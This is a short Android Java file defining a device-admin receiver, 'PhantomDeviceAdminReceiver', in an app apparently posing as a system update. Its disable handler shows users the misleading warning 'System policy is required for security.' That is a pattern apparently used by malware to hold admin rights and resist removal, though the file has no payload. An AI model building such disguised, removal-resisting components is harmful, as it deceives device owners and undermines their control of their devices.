package com.systemupdate.app;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class PhantomDeviceAdminReceiver extends DeviceAdminReceiver {
    @Override
    public void onEnabled(Context context, Intent intent) { }

    @Override
    public CharSequence onDisableRequested(final Context context, Intent intent) {
        return "System policy is required for security.";
    }

    @Override
    public void onDisabled(Context context, Intent intent) { }
}
